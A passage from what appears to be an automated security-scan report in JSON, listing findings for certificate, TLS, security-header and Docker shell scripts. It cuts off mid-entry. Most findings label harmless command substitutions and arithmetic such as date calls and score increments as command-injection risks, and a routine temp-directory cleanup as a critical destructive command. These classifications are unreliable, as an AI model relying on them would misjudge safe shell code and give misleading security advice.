    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/cryptography/certificate-management/resources/scripts/monitor_cert_expiry.sh",
      "line_number": 244,
      "issue": "Command substitution in shell",
      "evidence": "subject=$(echo \"$cert_info\" | grep \"subject=\" | cut -d= -f2-)",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/cryptography/certificate-management/resources/scripts/monitor_cert_expiry.sh",
      "line_number": 245,
      "issue": "Command substitution in shell",
      "evidence": "issuer=$(echo \"$cert_info\" | grep \"issuer=\" | cut -d= -f2-)",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/cryptography/certificate-management/resources/scripts/monitor_cert_expiry.sh",
      "line_number": 249,
      "issue": "Command substitution in shell",
      "evidence": "expiry_epoch=$(date -d \"$not_after\" +%s 2>/dev/null || date -j -f \"%b %d %T %Y %Z\" \"$not_after\" +%s 2>/dev/null)",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/cryptography/certificate-management/resources/scripts/monitor_cert_expiry.sh",
      "line_number": 250,
      "issue": "Command substitution in shell",
      "evidence": "now_epoch=$(date +%s)",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/cryptography/certificate-management/resources/scripts/monitor_cert_expiry.sh",
      "line_number": 251,
      "issue": "Command substitution in shell",
      "evidence": "days_remaining=$(( (expiry_epoch - now_epoch) / 86400 ))",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/cryptography/certificate-management/resources/scripts/monitor_cert_expiry.sh",
      "line_number": 321,
      "issue": "Command substitution in shell",
      "evidence": "result=$(printf '{\"file\":\"%s\",\"status\":\"error\",\"error\":\"File not found\"}' \"$cert_file\")",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/cryptography/certificate-management/resources/scripts/monitor_cert_expiry.sh",
      "line_number": 328,
      "issue": "Command substitution in shell",
      "evidence": "if ! cert_info=$(openssl x509 -in \"$cert_file\" -noout -dates -subject -issuer 2>/dev/null); then",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/cryptography/certificate-management/resources/scripts/monitor_cert_expiry.sh",
      "line_number": 329,
      "issue": "Command substitution in shell",
      "evidence": "result=$(printf '{\"file\":\"%s\",\"status\":\"error\",\"error\":\"Invalid certificate\"}' \"$cert_file\")",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/cryptography/certificate-management/resources/scripts/monitor_cert_expiry.sh",
      "line_number": 336,
      "issue": "Command substitution in shell",
      "evidence": "not_before=$(echo \"$cert_info\" | grep \"notBefore=\" | cut -d= -f2)",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/cryptography/certificate-management/resources/scripts/monitor_cert_expiry.sh",
      "line_number": 337,
      "issue": "Command substitution in shell",
      "evidence": "not_after=$(echo \"$cert_info\" | grep \"notAfter=\" | cut -d= -f2)",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/cryptography/certificate-management/resources/scripts/monitor_cert_expiry.sh",
      "line_number": 338,
      "issue": "Command substitution in shell",
      "evidence": "subject=$(echo \"$cert_info\" | grep \"subject=\" | cut -d= -f2-)",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/cryptography/certificate-management/resources/scripts/monitor_cert_expiry.sh",
      "line_number": 339,
      "issue": "Command substitution in shell",
      "evidence": "issuer=$(echo \"$cert_info\" | grep \"issuer=\" | cut -d= -f2-)",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/cryptography/certificate-management/resources/scripts/monitor_cert_expiry.sh",
      "line_number": 343,
      "issue": "Command substitution in shell",
      "evidence": "expiry_epoch=$(date -d \"$not_after\" +%s 2>/dev/null || date -j -f \"%b %d %T %Y %Z\" \"$not_after\" +%s 2>/dev/null)",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/cryptography/certificate-management/resources/scripts/monitor_cert_expiry.sh",
      "line_number": 344,
      "issue": "Command substitution in shell",
      "evidence": "now_epoch=$(date +%s)",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/cryptography/certificate-management/resources/scripts/monitor_cert_expiry.sh",
      "line_number": 345,
      "issue": "Command substitution in shell",
      "evidence": "days_remaining=$(( (expiry_epoch - now_epoch) / 86400 ))",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/cryptography/certificate-management/resources/scripts/monitor_cert_expiry.sh",
      "line_number": 425,
      "issue": "Command substitution in shell",
      "evidence": "\"timestamp\": \"$(date -u +\"%Y-%m-%dT%H:%M:%SZ\")\",",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/cryptography/certificate-management/resources/scripts/monitor_cert_expiry.sh",
      "line_number": 429,
      "issue": "Command substitution in shell",
      "evidence": "[[ $i -lt $((${#ALERTS[@]} - 1)) ]] && echo \",\"",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/cryptography/certificate-management/resources/scripts/monitor_cert_expiry.sh",
      "line_number": 479,
      "issue": "Command substitution in shell",
      "evidence": "[[ $i -lt $((${#RESULTS[@]} - 1)) ]] && echo \",\"",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/cryptography/certificate-management/resources/scripts/monitor_cert_expiry.sh",
      "line_number": 491,
      "issue": "Command substitution in shell",
      "evidence": "host=$(echo \"$result\" | grep -o '\"host\":\"[^\"]*\"' | cut -d'\"' -f4)",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/cryptography/certificate-management/resources/scripts/monitor_cert_expiry.sh",
      "line_number": 492,
      "issue": "Command substitution in shell",
      "evidence": "port=$(echo \"$result\" | grep -o '\"port\":[0-9]*' | grep -o '[0-9]*')",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/cryptography/certificate-management/resources/scripts/monitor_cert_expiry.sh",
      "line_number": 493,
      "issue": "Command substitution in shell",
      "evidence": "days=$(echo \"$result\" | grep -o '\"days_remaining\":[0-9-]*' | grep -o '[0-9-]*$')",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/cryptography/certificate-management/resources/scripts/monitor_cert_expiry.sh",
      "line_number": 494,
      "issue": "Command substitution in shell",
      "evidence": "status=$(echo \"$result\" | grep -o '\"status\":\"[^\"]*\"' | cut -d'\"' -f4)",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/cryptography/certificate-management/resources/scripts/monitor_cert_expiry.sh",
      "line_number": 510,
      "issue": "Command substitution in shell",
      "evidence": "printf \"Timestamp: %s\\n\" \"$(date -u +\"%Y-%m-%d %H:%M:%S UTC\")\"",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/cryptography/certificate-management/resources/scripts/monitor_cert_expiry.sh",
      "line_number": 515,
      "issue": "Command substitution in shell",
      "evidence": "printf \"%-40s %-10s %-15s %-25s\\n\" \"$(printf '%0.s-' {1..40})\" \"$(printf '%0.s-' {1..10})\" \"$(printf '%0.s-' {1..15})\" \"$(printf '%0.s-' {1..25})\"",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/cryptography/signing-verification/resources/examples/sigstore-cosign-container.sh",
      "line_number": 147,
      "issue": "Command substitution in shell",
      "evidence": "$(sed 's/^/            /' cosign.pub)",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/cryptography/signing-verification/resources/examples/sigstore-cosign-container.sh",
      "line_number": 178,
      "issue": "Command substitution in shell",
      "evidence": "-a \"timestamp=$(date -u +%Y-%m-%dT%H:%M:%SZ)\" \\",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/cryptography/tls-configuration/resources/scripts/validate_tls_config.sh",
      "line_number": 8,
      "issue": "Command substitution in shell",
      "evidence": "SCRIPT_NAME=$(basename \"$0\")",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/cryptography/tls-configuration/resources/scripts/validate_tls_config.sh",
      "line_number": 105,
      "issue": "Command substitution in shell",
      "evidence": "content=$(cat \"$file\")",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/cryptography/tls-configuration/resources/scripts/validate_tls_config.sh",
      "line_number": 192,
      "issue": "Command substitution in shell",
      "evidence": "max_age=$(echo \"$content\" | grep -o \"max-age=[0-9]*\" | head -1 | cut -d= -f2)",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/cryptography/tls-configuration/resources/scripts/validate_tls_config.sh",
      "line_number": 233,
      "issue": "Command substitution in shell",
      "evidence": "content=$(cat \"$file\")",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/cryptography/tls-configuration/resources/scripts/validate_tls_config.sh",
      "line_number": 323,
      "issue": "Command substitution in shell",
      "evidence": "\"timestamp\": \"$(date -u +\"%Y-%m-%dT%H:%M:%SZ\")\",",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/cryptography/tls-configuration/resources/scripts/validate_tls_config.sh",
      "line_number": 328,
      "issue": "Command substitution in shell",
      "evidence": "\"total\": $((PASSED + WARNINGS + ERRORS))",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/cryptography/tls-configuration/resources/scripts/validate_tls_config.sh",
      "line_number": 330,
      "issue": "Command substitution in shell",
      "evidence": "\"status\": \"$(if [[ $ERRORS -eq 0 ]]; then echo \"pass\"; else echo \"fail\"; fi)\",",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/cryptography/tls-configuration/resources/scripts/validate_tls_config.sh",
      "line_number": 331,
      "issue": "Command substitution in shell",
      "evidence": "\"grade\": \"$(if [[ $ERRORS -eq 0 ]] && [[ $WARNINGS -eq 0 ]]; then echo \"A+\"; elif [[ $ERRORS -eq 0 ]]; then echo \"B\"; else echo \"C\"; fi)\"",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/cryptography/tls-configuration/resources/scripts/validate_tls_config.sh",
      "line_number": 389,
      "issue": "Command substitution in shell",
      "evidence": "SERVER_TYPE=$(detect_server_type \"$CONFIG_FILE\")",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/security/vulnerability-assessment/resources/scripts/scan_dependencies.sh",
      "line_number": 55,
      "issue": "Command substitution in shell",
      "evidence": "echo '  \"scan_date\": \"'$(date -u +\"%Y-%m-%dT%H:%M:%SZ\")'\",' >> \"$OUTPUT_FILE\"",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/security/security-headers/resources/scripts/test_headers.sh",
      "line_number": 11,
      "issue": "Command substitution in shell",
      "evidence": "SCRIPT_DIR=\"$(cd \"$(dirname \"${BASH_SOURCE[0]}\")\" && pwd)\"",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/security/security-headers/resources/scripts/test_headers.sh",
      "line_number": 30,
      "issue": "Command substitution in shell",
      "evidence": "Usage: $(basename \"$0\") [OPTIONS] <url1> [url2 ...]",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/security/security-headers/resources/scripts/test_headers.sh",
      "line_number": 46,
      "issue": "Command substitution in shell",
      "evidence": "$(basename \"$0\") https://example.com",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/security/security-headers/resources/scripts/test_headers.sh",
      "line_number": 49,
      "issue": "Command substitution in shell",
      "evidence": "$(basename \"$0\") example.com example.org example.net",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/security/security-headers/resources/scripts/test_headers.sh",
      "line_number": 52,
      "issue": "Command substitution in shell",
      "evidence": "$(basename \"$0\") -f domains.txt",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/security/security-headers/resources/scripts/test_headers.sh",
      "line_number": 55,
      "issue": "Command substitution in shell",
      "evidence": "$(basename \"$0\") --output json example.com > results.json",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/security/security-headers/resources/scripts/test_headers.sh",
      "line_number": 58,
      "issue": "Command substitution in shell",
      "evidence": "$(basename \"$0\") --compare staging.example.com production.example.com",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/security/security-headers/resources/scripts/test_headers.sh",
      "line_number": 61,
      "issue": "Command substitution in shell",
      "evidence": "$(basename \"$0\") -j 10 -v -f domains.txt",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/security/security-headers/resources/scripts/test_headers.sh",
      "line_number": 125,
      "issue": "Command substitution in shell",
      "evidence": "if ! response=$(curl \"${curl_opts[@]}\" \"$url\" 2>&1); then",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/security/security-headers/resources/scripts/test_headers.sh",
      "line_number": 132,
      "issue": "Command substitution in shell",
      "evidence": "http_code=$(echo \"$response\" | grep \"^HTTP_CODE:\" | cut -d: -f2)",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/security/security-headers/resources/scripts/test_headers.sh",
      "line_number": 135,
      "issue": "Command substitution in shell",
      "evidence": "redirect_url=$(echo \"$response\" | grep \"^REDIRECT_URL:\" | cut -d: -f2- || echo \"$url\")",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/security/security-headers/resources/scripts/test_headers.sh",
      "line_number": 139,
      "issue": "Command substitution in shell",
      "evidence": "strict_transport_security=$(echo \"$response\" | grep -i \"^strict-transport-security:\" | cut -d: -f2- | xargs || echo \"\")",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/security/security-headers/resources/scripts/test_headers.sh",
      "line_number": 142,
      "issue": "Command substitution in shell",
      "evidence": "content_security_policy=$(echo \"$response\" | grep -i \"^content-security-policy:\" | cut -d: -f2- | xargs || echo \"\")",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/security/security-headers/resources/scripts/test_headers.sh",
      "line_number": 145,
      "issue": "Command substitution in shell",
      "evidence": "x_frame_options=$(echo \"$response\" | grep -i \"^x-frame-options:\" | cut -d: -f2- | xargs || echo \"\")",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/security/security-headers/resources/scripts/test_headers.sh",
      "line_number": 148,
      "issue": "Command substitution in shell",
      "evidence": "x_content_type_options=$(echo \"$response\" | grep -i \"^x-content-type-options:\" | cut -d: -f2- | xargs || echo \"\")",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/security/security-headers/resources/scripts/test_headers.sh",
      "line_number": 151,
      "issue": "Command substitution in shell",
      "evidence": "referrer_policy=$(echo \"$response\" | grep -i \"^referrer-policy:\" | cut -d: -f2- | xargs || echo \"\")",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/security/security-headers/resources/scripts/test_headers.sh",
      "line_number": 154,
      "issue": "Command substitution in shell",
      "evidence": "permissions_policy=$(echo \"$response\" | grep -i \"^permissions-policy:\" | cut -d: -f2- | xargs || echo \"\")",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/security/security-headers/resources/scripts/test_headers.sh",
      "line_number": 157,
      "issue": "Command substitution in shell",
      "evidence": "feature_policy=$(echo \"$response\" | grep -i \"^feature-policy:\" | cut -d: -f2- | xargs || echo \"\")",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/security/security-headers/resources/scripts/test_headers.sh",
      "line_number": 160,
      "issue": "Command substitution in shell",
      "evidence": "x_xss_protection=$(echo \"$response\" | grep -i \"^x-xss-protection:\" | cut -d: -f2- | xargs || echo \"\")",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/security/security-headers/resources/scripts/test_headers.sh",
      "line_number": 168,
      "issue": "Command substitution in shell",
      "evidence": "score=$((score + 20))",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/security/security-headers/resources/scripts/test_headers.sh",
      "line_number": 173,
      "issue": "Command substitution in shell",
      "evidence": "score=$((score + 30))",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/security/security-headers/resources/scripts/test_headers.sh",
      "line_number": 178,
      "issue": "Command substitution in shell",
      "evidence": "score=$((score + 15))",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/security/security-headers/resources/scripts/test_headers.sh",
      "line_number": 183,
      "issue": "Command substitution in shell",
      "evidence": "score=$((score + 15))",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/security/security-headers/resources/scripts/test_headers.sh",
      "line_number": 188,
      "issue": "Command substitution in shell",
      "evidence": "score=$((score + 10))",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/security/security-headers/resources/scripts/test_headers.sh",
      "line_number": 193,
      "issue": "Command substitution in shell",
      "evidence": "score=$((score + 10))",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/security/security-headers/resources/scripts/test_headers.sh",
      "line_number": 222,
      "issue": "Command substitution in shell",
      "evidence": "\"strict_transport_security\": $(if [ -n \"$strict_transport_security\" ]; then echo \"\\\"$strict_transport_security\\\"\"; else echo \"null\"; fi),",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/security/security-headers/resources/scripts/test_headers.sh",
      "line_number": 223,
      "issue": "Command substitution in shell",
      "evidence": "\"content_security_policy\": $(if [ -n \"$content_security_policy\" ]; then echo \"\\\"$content_security_policy\\\"\"; else echo \"null\"; fi),",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/security/security-headers/resources/scripts/test_headers.sh",
      "line_number": 224,
      "issue": "Command substitution in shell",
      "evidence": "\"x_frame_options\": $(if [ -n \"$x_frame_options\" ]; then echo \"\\\"$x_frame_options\\\"\"; else echo \"null\"; fi),",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/security/security-headers/resources/scripts/test_headers.sh",
      "line_number": 225,
      "issue": "Command substitution in shell",
      "evidence": "\"x_content_type_options\": $(if [ -n \"$x_content_type_options\" ]; then echo \"\\\"$x_content_type_options\\\"\"; else echo \"null\"; fi),",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/security/security-headers/resources/scripts/test_headers.sh",
      "line_number": 226,
      "issue": "Command substitution in shell",
      "evidence": "\"referrer_policy\": $(if [ -n \"$referrer_policy\" ]; then echo \"\\\"$referrer_policy\\\"\"; else echo \"null\"; fi),",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/security/security-headers/resources/scripts/test_headers.sh",
      "line_number": 227,
      "issue": "Command substitution in shell",
      "evidence": "\"permissions_policy\": $(if [ -n \"$permissions_policy\" ]; then echo \"\\\"$permissions_policy\\\"\"; else echo \"null\"; fi),",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/security/security-headers/resources/scripts/test_headers.sh",
      "line_number": 228,
      "issue": "Command substitution in shell",
      "evidence": "\"feature_policy\": $(if [ -n \"$feature_policy\" ]; then echo \"\\\"$feature_policy\\\"\"; else echo \"null\"; fi),",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/security/security-headers/resources/scripts/test_headers.sh",
      "line_number": 229,
      "issue": "Command substitution in shell",
      "evidence": "\"x_xss_protection\": $(if [ -n \"$x_xss_protection\" ]; then echo \"\\\"$x_xss_protection\\\"\"; else echo \"null\"; fi)",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/security/security-headers/resources/scripts/test_headers.sh",
      "line_number": 242,
      "issue": "Command substitution in shell",
      "evidence": "echo \"\\\"$url\\\",\\\"$grade\\\",$score,$([ -n \"$strict_transport_security\" ] && echo \"Yes\" || echo \"No\"),$([ -n \"$content_security_policy\" ] && echo \"Yes\" || echo \"No\"),$([ -n \"$x_frame_options\" ] && echo \"",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/security/security-headers/resources/scripts/test_headers.sh",
      "line_number": 255,
      "issue": "Command substitution in shell",
      "evidence": "[$([ -n \"$strict_transport_security\" ] && echo \"\u2713\" || echo \"\u2717\")] Strict-Transport-Security",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/security/security-headers/resources/scripts/test_headers.sh",
      "line_number": 258,
      "issue": "Command substitution in shell",
      "evidence": "[$([ -n \"$content_security_policy\" ] && echo \"\u2713\" || echo \"\u2717\")] Content-Security-Policy",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/security/security-headers/resources/scripts/test_headers.sh",
      "line_number": 261,
      "issue": "Command substitution in shell",
      "evidence": "[$([ -n \"$x_frame_options\" ] && echo \"\u2713\" || echo \"\u2717\")] X-Frame-Options",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/security/security-headers/resources/scripts/test_headers.sh",
      "line_number": 264,
      "issue": "Command substitution in shell",
      "evidence": "[$([ -n \"$x_content_type_options\" ] && echo \"\u2713\" || echo \"\u2717\")] X-Content-Type-Options",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/security/security-headers/resources/scripts/test_headers.sh",
      "line_number": 267,
      "issue": "Command substitution in shell",
      "evidence": "[$([ -n \"$referrer_policy\" ] && echo \"\u2713\" || echo \"\u2717\")] Referrer-Policy",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/security/security-headers/resources/scripts/test_headers.sh",
      "line_number": 270,
      "issue": "Command substitution in shell",
      "evidence": "[$([ -n \"$permissions_policy\" ] && echo \"\u2713\" || echo \"\u2717\")] Permissions-Policy",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/security/security-headers/resources/scripts/test_headers.sh",
      "line_number": 273,
      "issue": "Command substitution in shell",
      "evidence": "[$([ -n \"$feature_policy\" ] && echo \"\u2713\" || echo \"\u2717\")] Feature-Policy (deprecated)",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/security/security-headers/resources/scripts/test_headers.sh",
      "line_number": 276,
      "issue": "Command substitution in shell",
      "evidence": "[$([ -n \"$x_xss_protection\" ] && echo \"\u2713\" || echo \"\u2717\")] X-XSS-Protection",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/security/security-headers/resources/scripts/test_headers.sh",
      "line_number": 307,
      "issue": "Command substitution in shell",
      "evidence": "echo \"$(echo \"$header\" | tr '[:lower:]' '[:upper:]' | tr '-' ' '):\"",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/security/security-headers/resources/scripts/test_headers.sh",
      "line_number": 316,
      "issue": "Command substitution in shell",
      "evidence": "response=$(curl -s -I -L --max-time \"$TIMEOUT\" \"$url\" 2>&1 || echo \"\")",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/security/security-headers/resources/scripts/test_headers.sh",
      "line_number": 319,
      "issue": "Command substitution in shell",
      "evidence": "value=$(echo \"$response\" | grep -i \"^$header:\" | cut -d: -f2- | xargs || echo \"\")",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/security/security-headers/resources/scripts/test_headers.sh",
      "line_number": 412,
      "issue": "Command substitution in shell",
      "evidence": "TEMP_DIR=$(mktemp -d)",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "CRITICAL",
      "category": "Dangerous Command",
      "file": "skills/security/security-headers/resources/scripts/test_headers.sh",
      "line_number": 413,
      "issue": "Destructive file deletion",
      "evidence": "trap 'rm -rf \"$TEMP_DIR\"' EXIT  # Test cleanup - safe in test context",
      "recommendation": "Use safer alternatives or require explicit confirmation"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/security/security-headers/resources/scripts/test_headers.sh",
      "line_number": 424,
      "issue": "Command substitution in shell",
      "evidence": "printf \"%s\\n\" \"${URLS[@]}\" | xargs -P \"$PARALLEL_JOBS\" -I {} bash -c \"test_url '{}' '$TEMP_DIR/\\$(echo {} | md5sum | cut -d' ' -f1)'\"",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/security/security-headers/resources/scripts/test_headers.sh",
      "line_number": 444,
      "issue": "Command substitution in shell",
      "evidence": "first_file=$(find \"$TEMP_DIR\" -type f | head -n1)",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/containers/dockerfile-optimization/resources/scripts/optimize_image.sh",
      "line_number": 50,
      "issue": "Command substitution in shell",
      "evidence": "Usage: $(basename \"$0\") [OPTIONS] IMAGE_NAME",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/containers/dockerfile-optimization/resources/scripts/optimize_image.sh",
      "line_number": 63,
      "issue": "Command substitution in shell",
      "evidence": "$(basename \"$0\") myapp:latest",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/containers/dockerfile-optimization/resources/scripts/optimize_image.sh",
      "line_number": 66,
      "issue": "Command substitution in shell",
